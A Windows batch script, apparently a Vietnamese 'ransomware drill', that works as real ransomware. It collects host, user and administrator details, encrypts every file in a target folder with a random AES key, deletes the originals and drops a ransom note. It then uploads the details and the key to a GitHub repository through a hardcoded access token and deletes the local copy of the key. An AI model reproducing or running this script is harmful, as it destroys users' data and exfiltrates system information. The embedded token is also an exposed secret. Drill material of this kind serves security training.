@echo off
setlocal enabledelayedexpansion

:: =================================================================
:: PHAN CAU HINH - VUI LONG THAY DOI CAC GIA TRI DUOI DAY
:: =================================================================

:: --- Cau hinh cho phan Ma hoa (Tu script 1) ---
REM Thu muc chua cac file se bi ma hoa
set "TARGET_DIR=D:\NamTN\2025\Ransomware drill\Ransomware\Encrypt"
REM Ten file canh bao de lai sau khi ma hoa
set "RANSOM_NOTE=_FILES_ENCRYPTED_.txt"
REM Duoi file sau khi ma hoa
set "EXTENSION=.drill"

:: --- Cau hinh cho phan Upload len GitHub (Tu script 2) ---
REM Token truy cap ca nhan cua ban. RAT QUAN TRONG!
REM Tao tai: https://github.com/settings/tokens
SET "GITHUB_TOKEN=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"
REM Ten nguoi dung hoac to chuc tren GitHub
SET "GITHUB_OWNER=tsukiazuma"
REM Ten repository
SET "GITHUB_REPO=dientap"
REM (Tuy chon) Duong dan trong repo. De trong de luu o goc. Vi du: "data/"
SET "PATH_IN_REPO="


:: =================================================================
:: SCRIPT TU DONG - KHONG CAN CHINH SUA PHAN DUOI NAY
:: =================================================================

:: --- CAI DAT CHUNG ---
set "OUTPUT_FILE=%COMPUTERNAME%.txt"
set "OUTPUT_FILE_FULL_PATH=%cd%\%OUTPUT_FILE%"

echo ===================================================================
echo             KICH BAN DIEN TAP RANSOMWARE (GOP)
echo ===================================================================
echo.
echo [INFO] File luu thong tin va key se la: %OUTPUT_FILE%
echo.

:: ##################### PHAN 1: THU THAP THONG TIN HE THONG #####################
echo [PHAN 1] Bat dau thu thap thong tin he thong... Vui long cho.

REM Xoa file output cu neu co va tao file moi voi tieu de
echo THONG TIN HE THONG (%COMPUTERNAME%) > %OUTPUT_FILE%
echo Chay vao luc: %date% %time% >> %OUTPUT_FILE%
echo =================================================================== >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%

REM --- 1, 2 & 3. Thong tin OS, phien ban va ban va ---
echo [1, 2, 3] THONG TIN HE DIEU HANH, PHIEN BAN VA BAN VA >> %OUTPUT_FILE%
echo --------------------------------------------------- >> %OUTPUT_FILE%
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)" >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%

REM --- 4. Danh sach tai khoan va quyen quan tri ---
echo [4] TAI KHOAN NGUOI DUNG VA QUYEN QUAN TRI >> %OUTPUT_FILE%
echo -------------------------------------------- >> %OUTPUT_FILE%
echo --- Tat ca tai khoan nguoi dung (Local): >> %OUTPUT_FILE%
net user >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%
echo --- Tai khoan co quyen Quan tri (Members of Administrators group): >> %OUTPUT_FILE%
net localgroup Administrators >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%

REM --- 5. Ten may chu va thong tin Domain ---
echo [5] TEN MAY CHU (HOSTNAME) VA DOMAIN >> %OUTPUT_FILE%
echo -------------------------------------- >> %OUTPUT_FILE%
echo Hostname: %COMPUTERNAME% >> %OUTPUT_FILE%
echo Domain: %USERDOMAIN% >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%

echo [HOAN TAT PHAN 1] Da thu thap xong thong tin he thong.
echo.

:: ##################### PHAN 2: TAO KEY VA MA HOA DU LIEU #####################
echo [PHAN 2] Bat dau qua trinh ma hoa...

:: --- KIEM TRA DIEU KIEN TRUOC KHI CHAY ---
REM Kiểm tra xem OpenSSL đã được cài đặt chưa
where openssl >nul 2>nul
if %errorlevel% neq 0 (
    echo [LOI] OpenSSL khong duoc tim thay. Vui long cai dat OpenSSL va them vao bien PATH.
    pause
    exit /b 1
)

REM Kiểm tra xem thư mục đích có tồn tại không
if not exist "%TARGET_DIR%\" (
    echo [LOI] Thu muc "%TARGET_DIR%" khong ton tai.
    pause
    exit /b 1
)

REM Kiểm tra xem thư mục đã bị mã hóa chưa
echo [INFO] Kiem tra trang thai thu muc "%TARGET_DIR%"...
dir /s /b "%TARGET_DIR%\*%EXTENSION%" >nul 2>nul
if %errorlevel% equ 0 (
    echo [CANH BAO] Da tim thay file da ma hoa ^(duoi %EXTENSION%^) trong thu muc.
    echo Script se khong thuc hien de tranh ma hoa lai du lieu.
    goto UPLOAD_SECTION
)
echo [INFO] Thu muc chua bi ma hoa. Bat dau qua trinh ma hoa...
echo.

:: --- TAO KEY VA LUU VAO FILE ---
echo [INFO] Dang tao key ma hoa...
for /f "delims=" %%k in ('openssl rand -base64 32') do set "ENCRYPTION_KEY=%%k"
echo [INFO] Da tao key xong.

REM Ghi key vao cuoi file output
echo =================================================================== >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%
echo [KEY MA HOA] - Hay luu key nay can than de giai ma >> %OUTPUT_FILE%
echo --------------------------------------------------- >> %OUTPUT_FILE%
echo !ENCRYPTION_KEY! >> %OUTPUT_FILE%
echo [INFO] Da luu key vao file: %OUTPUT_FILE%
echo.

:: --- TIEN HANH MA HOA ---
pushd "%TARGET_DIR%"

echo [INFO] Bat dau ma hoa cac file trong "%TARGET_DIR%"...
for /r "%TARGET_DIR%" %%F in (*) do (
    set "filename=%%~nxF"
    set "extension=%%~xF"
    
    if /i not "%%~fF"=="%~f0" (
        if /i not "%%~fF"=="%OUTPUT_FILE_FULL_PATH%" (
            if /i not "!filename!"=="%RANSOM_NOTE%" (
                if /i not "!extension!"=="%EXTENSION%" (
                    openssl enc -aes-256-cbc -salt -in "%%F" -out "%%F%EXTENSION%" -pass pass:!ENCRYPTION_KEY! -pbkdf2
                    if !errorlevel! equ 0 (
                        del /F /Q "%%F"
                    ) else (
                        echo [LOI] Ma hoa file "%%F" that bai.
                    )
                )
            )
        )
    )
)

:: --- TAO FILE CANH BAO ---
echo [INFO] Dang tao file canh bao...
(
    echo @@@ CANH BAO QUAN TRONG @@@
    echo.
    echo Tat ca cac file quan trong cua ban trong thu muc %TARGET_DIR% da bi MA HOA.
    echo De khoi phuc lai file, ban can key giai ma duy nhat.
    echo.
    echo Day la mot phan cua DIEN TAP RANSOMWARE.
    echo.
    echo Vui long bao cao su co nay cho doi ngu IT/Security cua ban ngay lap tuc.
    echo Key giai ma da duoc luu cung thong tin he thong trong file:
    echo %OUTPUT_FILE_FULL_PATH%
) > %RANSOM_NOTE%

popd
echo [HOAN TAT PHAN 2] Qua trinh ma hoa da hoan thanh.
echo.

:UPLOAD_SECTION
:: ##################### PHAN 3: UPLOAD FILE KET QUA LEN GITHUB #####################
echo [PHAN 3] Bat dau tai file ket qua len GitHub...

:: --- KIEM TRA CAC YEU CAU ---
where curl >nul 2>nul
if %errorlevel% neq 0 (
    echo [LOI] curl.exe khong duoc tim thay. Vui long cai dat hoac dam bao no co trong bien PATH.
    pause
    exit /b 1
)

if not exist "%OUTPUT_FILE%" (
    echo [LOI] Khong tim thay file ket qua "%OUTPUT_FILE%" de tai len.
    pause
    exit /b 1
)

:: --- CHUAN BI ---
SET "FILENAME=%OUTPUT_FILE%"
SET "FULL_PATH_IN_REPO=%PATH_IN_REPO%%FILENAME%"
SET "BASE64_TEMP_FILE=base64_content.tmp"
SET "PAYLOAD_FILE=payload.json"
SET "API_RESPONSE_FILE=api_response.json"
SET "API_URL=https://api.github.com/repos/%GITHUB_OWNER%/%GITHUB_REPO%/contents/%FULL_PATH_IN_REPO%"

echo [INFO] Ten file upload: %FILENAME%
echo [INFO] URL API: %API_URL%

echo.
echo [B1] Ma hoa noi dung sang Base64...
certutil -encode "%FILENAME%" %BASE64_TEMP_FILE% > nul

set "BASE64_CONTENT="
for /f "tokens=* delims=" %%a in ('type %BASE64_TEMP_FILE% ^| findstr /v /c:"CERTIFICATE"') do (
    set "BASE64_CONTENT=!BASE64_CONTENT!%%a"
)
echo      + Ma hoa thanh cong.

echo.
echo [B2] Kiem tra file da ton tai tren GitHub de lay SHA...
curl -s -L -H "Accept: application/vnd.github+json" -H "Authorization: Bearer %GITHUB_TOKEN%" "%API_URL%" -o %API_RESPONSE_FILE%

set "FILE_SHA="
for /f "tokens=2 delims=:," %%s in ('type %API_RESPONSE_FILE% ^| findstr /i "\"sha\""') do (
    set "sha_temp=%%s"
    set "sha_temp=!sha_temp:"=!"
    set "sha_temp=!sha_temp: =!"
    set "FILE_SHA=!sha_temp!"
    goto :found_sha
)
:found_sha

echo.
echo [B3] Tao JSON payload de gui len API...
IF DEFINED FILE_SHA (
    echo      + File da ton tai. Se thuc hien cap nhat. SHA: !FILE_SHA!
    (
        echo {
        echo   "message": "Update %FILENAME% via API",
        echo   "content": "!BASE64_CONTENT!",
        echo   "sha": "!FILE_SHA!"
        echo }
    ) > %PAYLOAD_FILE%
) ELSE (
    echo      + File chua ton tai. Se thuc hien tao moi.
    (
        echo {
        echo   "message": "Create %FILENAME% via API",
        echo   "content": "!BASE64_CONTENT!"
        echo }
    ) > %PAYLOAD_FILE%
)
echo      + Da tao file '%PAYLOAD_FILE%'.

echo.
echo [B4] Goi API de upload file...
curl -s -X PUT -H "Accept: application/vnd.github+json" -H "Authorization: Bearer %GITHUB_TOKEN%" -d @%PAYLOAD_FILE% "%API_URL%"
echo.

echo [HOAN TAT PHAN 3] Qua trinh upload da hoan tat.
echo.

:: ################################## KET THUC ##################################
echo =================================================================
echo             HOAN THANH TOAN BO KICH BAN!
echo =================================================================
echo + Thong tin he thong va key giai ma da duoc luu tai: %OUTPUT_FILE_FULL_PATH%
echo + File ket qua da duoc tai len repo:
echo   https://github.com/%GITHUB_OWNER%/%GITHUB_REPO%/
echo =================================================================

:: Don dep cac file tam (giu lai file %OUTPUT_FILE%)
del %BASE64_TEMP_FILE% > nul 2>&1
del %PAYLOAD_FILE% > nul 2>&1
del %API_RESPONSE_FILE% > nul 2>&1
del %OUTPUT_FILE% > nul 2>&1

endlocal
pause